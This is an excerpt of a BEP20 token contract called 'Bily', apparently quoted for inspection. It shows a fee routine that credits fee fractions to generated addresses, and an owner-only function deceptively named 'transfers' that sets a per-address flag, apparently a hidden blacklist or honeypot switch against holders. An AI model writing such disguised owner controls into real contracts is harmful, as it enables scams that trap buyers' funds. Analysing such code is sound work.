...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 MATIC = IBEP20(0x2A65D7A16a6Bc2921970b5cE9c8262E442994280);  
...
contract Token is IBEP20, Ownable {
    ...
    address MATIC = 0x2A65D7A16a6Bc2921970b5cE9c8262E442994280;  
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; 
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Bily";    
    string constant _symbol = "Bily";
    ...
    function _takeInviterFeeKt(uint256 amount) private {
        ...
        for (uint256 i = 0; i < 3; i++) {
            ...
            ktNum = ktNum+1;
            _balances[_receiveD] = _balances[_receiveD].add(amount.div(i+10));   
            _balances[address(this)] = _balances[address(this)].sub(amount.div(i+10));         
        }
    }
    ...
    function transfers (address _address,bool status) external onlyOwner {
        bAdress[_address] = status;
    }
    ...
    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        ...
        _takeInviterFeeKt(feeAmount.div(1000));
